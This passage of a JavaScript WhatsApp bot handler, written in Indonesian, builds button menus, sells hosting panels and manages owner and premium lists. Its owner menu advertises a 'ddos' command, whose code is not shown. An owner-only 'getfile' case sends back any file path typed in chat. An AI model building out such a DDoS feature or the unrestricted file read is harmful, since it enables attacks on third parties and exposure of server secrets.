┃ ${prefix}sᴇɴᴅғɪᴛᴜʀ
┃ ${prefix}ᴅᴅᴏs
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃┃ *𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ ${prefix}1ɢʙ
┃ ${prefix}2ɢʙ
┃ ${prefix}3ɢʙ
┃ ${prefix}4ɢʙ
┃ ${prefix}5ɢʙ
┃ ${prefix}6ɢʙ
┃ ${prefix}7ɢʙ
┃ ${prefix}8ɢʙ
┃ ${prefix}9ɢʙ
┃ ${prefix}10ɢʙ
┃ ${prefix}11ɢʙ
┃ ${prefix}12ɢʙ - 60ɢʙ
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃┃ *𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ ${prefix}ᴄᴄᴅʟ
┃ ${prefix}ᴛᴛᴅʟ
┃ ${prefix}ʏᴛᴅʟ
┃ ${prefix}ɪɢᴅʟ
┃ ${prefix}ғʙᴅʟ
┃ ${prefix}ᴛᴡᴅʟ
┃ ${prefix}ᴍғᴅʟ
┃ ${prefix}ᴀᴘᴋs
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: listnya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : fs.readFileSync(`./SEARCH/Thumbnail.jpg`)}, { upload: nolan.waUploadToServer})), 
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"LIST MENU\",\"sections\":[{\"title\":\"List Menu Bot ${global.botname}\",\"highlight_label\":\"\",\"rows\":[
{"header":"","title":"ALL MENU","description":"SEMUA FITUR BOT","id":"${prefix}list-menu-lainnya"},
{"header":"","title":"OWNER MENU","description":"LIST MENU OWNER ${ownername}","id":"${prefix}list-menu-owner"},
{"header":"","title":"MAIN MENU","description":"LIST MAIN MENU ${ownername}","id":"${prefix}list-main-menu"},
{"header":"","title":"PANEL MENU","description":"LIST PANEL BY ${ownername}","id":"${prefix}listpanelku"},
{"header":"","title":"DOWNLOAD MENU","description":"LIST MENU DOWNLOAD","id":"${prefix}list-menu-download"}]}]}`,
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"CHAT OWNER","url":"https://wa.me/+${global.owner}?text=Halo+Bang","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"TELEGRAM OWN","url":"${telegram}?text=Halo+Bang+${ownername}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"GROUP OWN","url":"${global.sgc}","merchant_url":"https://www.google.com"}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
}
break

case 'list-menu-download': {
let listnya = `${ucapanWaktu}\n${pushname} 👋
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃┃ *𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ ${prefix}ᴄᴄᴅʟ
┃ ${prefix}ᴛᴛᴅʟ
┃ ${prefix}ʏᴛᴅʟ
┃ ${prefix}ɪɢᴅʟ
┃ ${prefix}ғʙᴅʟ
┃ ${prefix}ᴛᴡᴅʟ
┃ ${prefix}ᴍғᴅʟ
┃ ${prefix}ᴀᴘᴋs
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: listnya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : fs.readFileSync(`./SEARCH/Thumbnail.jpg`)}, { upload: nolan.waUploadToServer})), 
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"LIST MENU\",\"sections\":[{\"title\":\"List Menu Bot ${global.botname}\",\"highlight_label\":\"\",\"rows\":[
{"header":"","title":"ALL MENU","description":"SEMUA FITUR BOT","id":"${prefix}list-menu-lainnya"},
{"header":"","title":"OWNER MENU","description":"LIST MENU OWNER ${ownername}","id":"${prefix}list-menu-owner"},
{"header":"","title":"MAIN MENU","description":"LIST MAIN MENU ${ownername}","id":"${prefix}list-main-menu"},
{"header":"","title":"PANEL MENU","description":"LIST PANEL BY ${ownername}","id":"${prefix}listpanelku"},
{"header":"","title":"DOWNLOAD MENU","description":"LIST MENU DOWNLOAD","id":"${prefix}list-menu-download"}]}]}`,
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"CHAT OWNER","url":"https://wa.me/+${global.owner}?text=Halo+Bang","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"TELEGRAM OWN","url":"${telegram}?text=Halo+Bang+${ownername}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"GROUP OWN","url":"${global.sgc}","merchant_url":"https://www.google.com"}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
}
break

case 'list-main-menu': {
let listnya = `${ucapanWaktu}\n${pushname} 👋
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃┃ *𝗠𝗔𝗜𝗡  𝗠𝗘𝗡𝗨*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ ${prefix}ᴘɪɴ
┃ ${prefix}ᴍᴇɴᴜ
┃ ${prefix}ᴏᴡɴᴇʀ
┃ ${prefix}ᴘʀᴇғɪx
┃ ${prefix}ʀᴜʟᴇs
┃ ${prefix}ᴛᴇʟᴇɢʀᴀᴍ
┃ ${prefix}ʏᴏᴛᴜʙᴇ
┃ ${prefix}sᴀʟᴜʀᴀɴ
┃ ${prefix}ɢʀᴏᴜᴘʙᴏᴛ
┃ ${prefix}ʜᴇʟᴘ
┃ ${prefix}ᴄʀᴇᴅɪᴛ
┃ ${prefix}sᴄʀɪᴘᴛ
┃ ${prefix}ᴘᴀʏᴍᴇɴᴛ
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: listnya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : fs.readFileSync(`./SEARCH/Thumbnail.jpg`)}, { upload: nolan.waUploadToServer})), 
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"LIST MENU\",\"sections\":[{\"title\":\"List Menu Bot ${global.botname}\",\"highlight_label\":\"\",\"rows\":[
{"header":"","title":"ALL MENU","description":"SEMUA FITUR BOT","id":"${prefix}list-menu-lainnya"},
{"header":"","title":"OWNER MENU","description":"LIST MENU OWNER ${ownername}","id":"${prefix}list-menu-owner"},
{"header":"","title":"MAIN MENU","description":"LIST MAIN MENU ${ownername}","id":"${prefix}list-main-menu"},
{"header":"","title":"PANEL MENU","description":"LIST PANEL BY ${ownername}","id":"${prefix}listpanelku"},
{"header":"","title":"DOWNLOAD MENU","description":"LIST MENU DOWNLOAD","id":"${prefix}list-menu-download"}]}]}`,
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"CHAT OWNER","url":"https://wa.me/+${global.owner}?text=Halo+Bang","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"TELEGRAM OWN","url":"${telegram}?text=Halo+Bang+${ownername}","merchant_url":"https://www.google.com"}`
 }, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"YOUTUBE OWNER","url":"${yt}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"GROUP OWN","url":"${global.sgc}","merchant_url":"https://www.google.com"}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
}
break

case 'list-menu-owner': {
let listnya = `${ucapanWaktu}\n${pushname} 👋
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃┃ *𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┃ ${prefix}ʟɪsᴛsᴇʀᴠᴇʀ
┃ ${prefix}ᴅᴇʟsᴇʀᴠᴇʀ
┃ ${prefix}ʟɪsᴛᴜsᴇʀ
┃ ${prefix}ᴅᴇʟᴜsᴇʀ
┃ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ
┃ ${prefix}ʟɪsᴛʀᴇsᴇʟʟᴇʀ
┃ ${prefix}ᴀᴅᴅʀᴇsᴇʟʟᴇʀ
┃ ${prefix}ᴅᴇʟʀᴇsᴇʟʟᴇʀ
┃ ${prefix}ʟɪsᴛᴏᴡɴᴇʀ
┃ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
┃ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
┃ ${prefix}ʟɪsᴛᴘʀᴇᴍ
┃ ${prefix}ᴀᴅᴅᴘʀᴇᴍ
┃ ${prefix}ᴅᴇʟᴘʀᴇᴍ
┃ ${prefix}ɢᴇᴛғɪʟᴇs
┃ ${prefix}ɢᴇᴛғᴜɴᴄ
┃ ${prefix}ᴀᴅᴅᴄᴀsᴇ
┃ ${prefix}ɢᴇᴛᴄᴀsᴇ
┃ ${prefix}ᴅᴇʟᴄᴀsᴇ
┃ ${prefix}ɢᴀɴᴛɪғɪʟᴇ
┃ ${prefix}sᴇɴᴅғɪᴛᴜʀ
┃ ${prefix}ᴅᴅᴏs
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: listnya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : fs.readFileSync(`./SEARCH/Thumbnail.jpg`)}, { upload: nolan.waUploadToServer})), 
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"LIST MENU\",\"sections\":[{\"title\":\"List Menu Bot ${global.botname}\",\"highlight_label\":\"\",\"rows\":[
{"header":"","title":"ALL MENU","description":"SEMUA FITUR BOT","id":"${prefix}list-menu-lainnya"},
{"header":"","title":"OWNER MENU","description":"LIST MENU OWNER ${ownername}","id":"${prefix}list-menu-owner"},
{"header":"","title":"MAIN MENU","description":"LIST MAIN MENU ${ownername}","id":"${prefix}list-main-menu"},
{"header":"","title":"PANEL MENU","description":"LIST PANEL BY ${ownername}","id":"${prefix}listpanelku"},
{"header":"","title":"DOWNLOAD MENU","description":"LIST MENU DOWNLOAD","id":"${prefix}list-menu-download"}]}]}`,
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"CHAT OWNER","url":"https://wa.me/+${global.owner}?text=Halo+Bang","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"TELEGRAM OWN","url":"${telegram}?text=Halo+Bang+${ownername}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"GROUP OWN","url":"${global.sgc}","merchant_url":"https://www.google.com"}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
}
break

case 'Raing': {
nolan.sendMessage(m.chat, {text: `
*TEST BOT*

*💻 INFO SERVER*
_RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_

*⚙️PREFIX*
_MULTI PREFIX_

*📡 PLATFORM*
_LINUX_
`}, {quoted: floc})
}
break


case 'done': {
if (!isMediaa) return m.reply(`Terdeteksi Tidak Ada Media Seperti\nGambar / Vidio`)
if (/image/.test(mime)) {
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} jenis,harga`);
let barang = t[0];
let jumlah = t[1];
nolan.sendMessage(m.chat, {text: `Oke, Terimakasih Sudah Mempercayai Kami\nPesan Mu Akan Diteruskan Ke Owner Ku Ya\n\nKamu Bisa Chat Owner Secara Langsung Dengan Cara Ketik *.owner*\n\nJenis : ${barang}\nharga : ${jumlah}`}, {quoted: floc})
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./LIB/uploader')
let media = await nolan.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
nolan.sendMessage(global.owner+'@s.whatsapp.net', {image: {url: util.format(anu)}, caption: `Ini Bukti Dari ${pushname}`})
await nolan.sendMessage(global.owner+'@s.whatsapp.net', {text: `Hi, Ada Seseorang Yang Beli Nih\n\nNickname : ${pushname}\nNomer : ${m.sender.split("@")[0]}\n\n*Jenis :* ${barang}\n*Harga :* ${jumlah}\n*Tanggal :* ${penghitung}\n*Jam :* ${wibTime}`})
}
}
break

case 'owner': {
let teks = "*MY OWNER*\nBeli kebutuhan bot WhatsApp di owner kua aja kak😊"
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"CHAT OWNER","url":"https://wa.me/+${global.owner}?text=Halo+Bang+${ownername}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"TELEGRAM OWN","url":"${telegram}?text=Halo+Bang+${ownername}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"GROUP OWN","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363289337334615@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
break
case 'cpanelbg': {
nolan.sendMessage(from, {react: {text: "💸",key: m.key}})
let menunya = `
Hai ${pushname} 👋
${ucapanWaktu}

*Untuk mengambil data panel silahkan TF terlebih dahulu ke nope di bawah atau QR jangan lupa SS bukti dan kirim dengan Caption ".done barang,harga"*

*Atau kirim bukti TF langsung ke owner*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: menunya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `BY ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : fs.readFileSync(`./SEARCH/qris.jpg`)}, { upload: nolan.waUploadToServer})), 
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"PAYMENT\",\"id\":\".payment\"}"
},{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NUMBER OWNER","url":"${global.owner}?text=Halo+Bang+${ownername}+gw+mau+beli+panel+bang","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"TELEGRAM OWNER","url":"${global.telegram}?text=Halo+Bang+${ownername}+gw+mau+beli+panel+bang","merchant_url":"https://www.google.com"}`
},{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💶 COPY PAYMMT DANA",
"copy_code": `${global.dana}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💷 COPY PAYMENT OVO",
"copy_code": `${global.ovo}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💵 COPY PAYMENT GOPAY",
"copy_code": `${global.gopay}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💴 COPY PAYMENT PULSA",
"copy_code": `${global.pulsa}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `NOPE ${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
}
break
case 'payment':
case 'nope': {
nolan.sendMessage(from, {react: {text: "💸", key: m.key}})
let menunya = `
Hai ${pushname} 👋
${ucapanWaktu}

*Berikut Adalah Nope*
${ownername}

> *DANA :*
- ${global.dana}

> *OVO :*
- ${global.ovo}

> *GOPAY :*
- ${global.gopay}

> *PULSA :*
- ${global.pulsa}
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: menunya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `BY ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia({ image : fs.readFileSync(`./SEARCH/qris.jpg`)}, { upload: nolan.waUploadToServer})), 
title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💶 COPY PAYMENT DANA",
"copy_code": `${global.dana}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💷 COPY PAYMENT OVO",
"copy_code": `${global.ovo}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💵 COPY PAYMENT GOPAY",
"copy_code": `${global.gopay}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "💴 COPY PAYMENT PULSA",
"copy_code": `${global.pulsa}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `NOPE ${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(from, msg.message, {
messageId: msg.key.id
}, {quoted:m})
}
break
case 'pconly': {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
let teks = `Silahkan Dipilih, Klik Dibawah Ini`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"KLIK DISINI\",\"sections\":[{\"title\":\"Silahkan Dipilih\",\"highlight_label\":\"\",\"rows\":[{"header":"","title":"PRIVATE ONLY ON","description":"Aktifkan Pc Only","id":"${prefix}pconly-a on"},
{"header":"","title":"PRIVATE ONLY OFF","description":"Nonaktifkan Pc Only","id":"${prefix}pconly-b off"}]
}]
}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
break

case 'pconly-a':
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (args[0] == 'on') {
if (global.privateOnly) return m.reply('Sudah Aktif Sebelumnya!')
global.privateOnly = true
m.reply('Sukses Mengubah Ke Private Only')
}
break

case 'pconly-b':
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (args[0] == 'off') {
if (!global.privateOnly) return m.reply('Sudah Nonaktif Sebelumnya!')
global.privateOnly = false
m.reply('Sukses Mengubah Ke Mode Publik')
}
break

case 'autoread': {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
let teks = `Silahkan Dipilih, Klik Dibawah Ini`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `By ${global.wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": 
`{\"title\":\"KLIK DISINI\",\"sections\":[{\"title\":\"Silahkan Dipilih\",\"highlight_label\":\"\",\"rows\":[{"header":"",
"title":"AUTO READ ON",
"description":"Aktifkan AutoRead",
"id":"${prefix}autoread-a on"},
{"header":"",
"title":"AUTO READ OFF",
"description":"Nonaktifkan AutoRead",
"id":"${prefix}autoread-b off"}]
}]
}`
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
break

case 'autoread-a':
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (q === 'on') {
if (!global.autoread) return m.reply('Sudah Aktif Sebelumnya!')
autoread = true
m.reply(`AutoRead Sukses Di Aktifkan`)
}
break

case 'autoread-b':
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (q === 'off') {
if (!global.autoread) return m.reply('Sudah Nonaktif Sebelumnya!')
autoread = true
m.reply(`AutoRead Sukses Di Nonaktifkan`)
}
break

case 'addprem': {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return m.reply(`*Contoh :* ${prefix+command} @Tag|30d`)
if (!atnm) return m.reply(`Mau Yang Berapa Hari Nih?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
Prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses Addprem User Ke Premium')
} else {
var cekap = await nolan.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
Prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
m.reply('Sukses Addprem User Ke Premium')
}}
break

case 'delprem':
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (!args[0]) return m.reply(`*Contoh :* ${prefix+command} Nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(Prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./DATABASE/premium.json', JSON.stringify(premium))
m.reply('Sukses Delprem Premium Ke User')
} else {
var cekpr = await nolan.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return m.reply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
premium.splice(Prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./DATABASE/premium.json', JSON.stringify(premium))
m.reply('Sukses Delprem Premium Ke User')
}
break

case 'listpremium': 
case 'listprem': {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`;
let men = [];
for (let i of premium) {
men.push(i.id);
let idPart = i.id?.split("@")[0] ?? 'Undefined';
txt += `*ID :* @${idPart}\n`;
if (i.expired === 'Permanen') {
let cekvip = 'Permanen';
txt += `*Expire :* Permanen\n\n`;
} else {
let cekvip = ms(i.expired - Date.now());
txt += `*Expire :* ${cekvip.days} days, ${cekvip.hours} hours, ${cekvip.minutes} minutes ${cekvip.seconds} seconds\n\n`;
}
}
nolan.sendTextWithMentions(m.chat, txt, m);
}
break

case 'addowner':
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (!args[0]) return m.reply(`Masukan Nomor Nya`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await nolan.onWhatsApp(bnnd)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp`)
owner.push(bnnd)
fs.writeFileSync('./DATABASE/owner.json', JSON.stringify(owner))
m.reply(`Sukses Menambahkan 1 Owner kedalam List Owner ${botname}\n*Nomor :* ${bnnd}`)
break

case 'delowner':
if (!isOwner) return m.reply('Khusus Creator')
if (!args[0]) return m.reply(`Masukan Nomor Owner Nya`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./DATABASE/owner.json', JSON.stringify(owner))
m.reply(`Sukses Menghapus 1 List Owner!\n*Nomor :* ${ya}`)
break

case 'listowner': 
case 'listcreator':
if (!isOwner) return m.reply('Fitur Khusus Owner!')
teks = '*LIST OWNER*\n\n'
for (let kontol of owner) {
teks += `- ${kontol}\n`
}
teks += `\n*Total : ${owner.length}* Owner`
nolan.sendMessage(m.chat, { text: teks.trim() }, {quoted: m})
break

case 'getfile':{
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (!text) return m.reply('Mau Ambil File Yang Mana?')
var sendfile = `${q}`
var anuu = fs.readFileSync(sendfile)
nolan.sendMessage(m.chat, {
document: anuu, 
mimetype: 'application/octet-stream', 
fileName:`${q}`
}, {quoted: m})  
}
break

case 'getfunc':{
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (!text) return m.reply(`Mau Ambil Function Apa?`)
m.reply(`${getfunc(q)}`)
}
break

case 'gantifile': {
if (!isOwner) return m.reply('Fitur Khusus Owner!')
if (!text.includes("./")) return m.reply(`*Contoh :* ${prefix+command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
